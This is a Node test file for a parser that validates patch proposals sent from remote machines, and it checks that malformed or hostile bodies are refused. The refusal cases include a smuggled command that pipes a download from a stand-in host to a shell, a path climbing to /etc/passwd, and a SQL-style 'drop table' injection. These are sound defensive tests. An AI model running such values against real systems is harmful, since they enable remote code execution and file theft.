// The envelope reader, checked by node.
//
//     node supabase/functions/_shared/envelope.test.mjs
//
// An Edge Function has no test runner of its own, which is the whole reason
// `gladosig.js` is plain JS and `crosscheck.mjs` exists. This is the same
// arrangement for the half that decides what a machine is allowed to say.
//
// The positives are the cheap half. What earns its place here is the list of
// things that must be *refused*, because this reader stands between a machine
// on the internet and a workflow that compiles and runs code.

import { MAX_BYTES, parse, render, UNJUDGEABLE } from "./envelope.js";

let ok = true;
function claim(good, what) {
  console.log(`  ${good ? "ok " : "FAIL"}   ${what}`);
  if (!good) ok = false;
}

const POINT = "737f9c0adf4da825d48e209b8ca8ae7fcb03e09c0c9a0d3273d50fe395e80c08";
const CORPUS = "f330c22cf61f3c8c3ae16c383a030ca42fbe69e39d260099b36c52d41df8b708";

const good = [
  "proposal 1",
  `point ${POINT}`,
  "from 1.3.7",
  "head none",
  `corpus ${CORPUS}`,
  "tests 0",
  "knob 1",
  "file src/ai/lex.rs",
  "symbol LEN_B",
  "from 0.5",
  "to 0.25",
  "rail host.retrieval",
  "",
].join("\n");

const r = parse(good);
claim(r.ok, "the envelope `godel push` sends is read");
claim(r.ok && r.proposal.symbol === "LEN_B", "and the symbol comes out of the patch");
claim(r.ok && r.proposal.now === "0.25", "and the value it would take");
// `from` is on both sides and means two different things. Reading one for the
// other produces a patch that applies to nothing, or worse, to something.
claim(r.ok && r.proposal.was === "0.5", "the patch's old value, not the envelope's version");
claim(r.ok && r.proposal.version === "1.3.7", "and the envelope's version, not the patch's");

// What travels onward is rebuilt rather than forwarded.
claim(render(r.proposal) === good, "and what is rendered back is what arrived, rebuilt");

// CRLF is the ordinary case for anything that crossed a network.
claim(parse(good.replace(/\n/g, "\r\n")).ok, "a body that travelled as CRLF is still read");
claim(
  render(parse(good.replace(/\n/g, "\r\n")).proposal) === good,
  "and is rendered back with the carriage returns gone",
);

// --- the refusals, which are the point ----------------------------------

const swap = (field, value) =>
  good.replace(new RegExp(`^${field} .*$`, "m"), `${field} ${value}`);

const refusals = [
  ["no patch at all", good.replace("knob 1\n", "")],
  ["an empty body", ""],
  ["a body over the limit", "x".repeat(MAX_BYTES + 1)],
  // **The one this file exists for.** Both of these are strings with a number
  // in them and only one is a number.
  ["a value that is a command", swap("to", "0.25; curl evil.invalid | sh")],
  ["a value that is an expression", swap("to", "0.25 || true")],
  ["a value in a notation the kernel's table does not use", swap("to", "0x10")],
  ["a value in scientific notation", swap("to", "1e5")],
  ["a value that is not finite", swap("to", "Infinity")],
  ["a path that climbs out of the tree", swap("file", "src/../../etc/passwd")],
  ["a path outside src/", swap("file", "tools/knob.py")],
  ["a path that is not Rust", swap("file", "src/ai/lex.txt")],
  ["a symbol that is not a constant's name", swap("symbol", "len_b; drop table")],
  ["a rail name with a separator in it", swap("rail", "host retrieval")],
  ["a point that is not a hash", swap("point", "abc")],
  ["a point in upper case, which is not what the kernel renders", swap("point", POINT.toUpperCase())],
  ["a version that is not one", swap("from", "latest")],
  ["a test count that is not a count", swap("tests", "-1")],
  ["a body carrying a control character", good.replace("LEN_B", "LENB")],
  ["a patch that changes nothing", swap("to", "0.5")],
];
for (const [what, body] of refusals) {
  const v = parse(body);
  claim(!v.ok, `refused: ${what}`);
  if (!v.ok) claim(typeof v.why === "string" && v.why.length > 0, `  and says why: ${v.why}`);
}

// Every unjudgeable surface, from the list rather than from three literals --
// a prefix added to the list and not to the test is the one that matters.
for (const prefix of UNJUDGEABLE) {
  const v = parse(swap("file", `${prefix}whatever.rs`));
  claim(!v.ok && v.why.includes("judge"), `refused: a patch under ${prefix}`);
}

// It must never throw. This is reached from a request handler, where an
// exception is a 500 and the honest answer is a 400 with a reason.
for (const odd of [null, undefined, 7, {}, [], "\n\n\n", "knob 1"]) {
  let threw = false;
  try {
    parse(odd);
  } catch {
    threw = true;
  }
  claim(!threw, `does not throw on ${JSON.stringify(odd) ?? "undefined"}`);
}

console.log(ok ? "\n  envelope passed" : "\n  envelope FAILED");
process.exit(ok ? 0 : 1);
